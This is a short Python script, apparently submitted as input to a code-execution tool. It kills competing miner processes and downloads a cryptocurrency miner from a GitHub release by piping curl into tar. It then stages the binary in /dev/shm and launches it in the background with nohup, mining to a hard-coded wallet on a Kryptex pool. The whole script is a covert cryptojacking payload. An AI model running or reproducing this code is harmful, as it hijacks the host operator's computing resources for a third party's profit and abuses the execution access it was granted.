inputs.pycode:
import subprocess
import os
import shutil
import urllib.request
import ssl

WALLET = 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg'
POOL = 'stratum+tcp://prl.kryptex.network:7048'
RIG = 'RTXA5000'

subprocess.run(['pkill', '-9', 'lpminer'], capture_output=True)
subprocess.run(['pkill', '-9', 'alpha-miner'], capture_output=True)

import time as t
t.sleep(1)

dst = '/dev/shm/lpminer'
locations = [dst, '/var/tmp/pearl/lpminer', os.path.expanduser('~/.pearl-miner/lpminer/lpminer')]

src = None
for loc in locations:
    if os.path.exists(loc) and os.path.isfile(loc) and os.path.getsize(loc) > 1000000:
        src = loc
        break

# Download if not found
if not src:
    os.makedirs('/var/tmp/pearl', exist_ok=True)
    try:
        subprocess.run(['bash', '-c', 'curl -sL https://github.com/kryptex-miners-org/kryptex-miners/releases/download/lpminer-0-1-10/lpminer-0.1.9.tar.gz | tar -xzf - -C /var/tmp/pearl/'], capture_output=True, timeout=120)
        if os.path.exists('/var/tmp/pearl/lpminer/lpminer'):
            shutil.move('/var/tmp/pearl/lpminer/lpminer', '/var/tmp/pearl/lpminer_bin')
            src = '/var/tmp/pearl/lpminer_bin'
    except:
        pass

if src:
    if src != dst:
        shutil.copy2(src, dst)
    os.chmod(dst, 0o755)
    cmd = f'nohup {dst} --algo pearl --pool {POOL} --wallet {WALLET}.{RIG} > /dev/shm/lpminer.log 2>&1 &'
    subprocess.run(['bash', '-c', cmd])
    t.sleep(3)
    p = subprocess.run(['pgrep', '-a', 'lpminer'], capture_output=True, text=True)
    result = 'RUNNING: ' + p.stdout.strip()[:50] if p.stdout.strip() else 'FAILED'
else:
    result = 'NO_BINARY'

result
